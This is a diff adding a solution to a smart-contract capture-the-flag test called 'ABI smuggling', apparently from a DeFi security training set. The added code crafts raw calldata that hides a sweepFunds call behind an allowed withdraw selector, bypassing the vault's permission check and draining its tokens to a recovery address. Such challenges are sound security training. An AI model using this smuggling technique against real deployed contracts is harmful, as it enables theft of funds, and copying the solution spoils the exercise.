@@ -45,6 +45,14 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let target = vault.address;
+        let executeData = `0x1cff79cd000000000000000000000000${(vault.address).substr(2)}00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d9caed1200000000000000000000000000000000000000000000000000000000`;
+        let actionData = `000000000000000000000000000000000000000000000000000000000000004485fb709d000000000000000000000000${(recovery.address).substr(2)}000000000000000000000000${(token.address).substr(2)}`;
+        let tx = {
+            to: vault.address,
+            data: executeData.concat(actionData)
+        }
+        await player.sendTransaction(tx);
     });
 
     after(async function () {
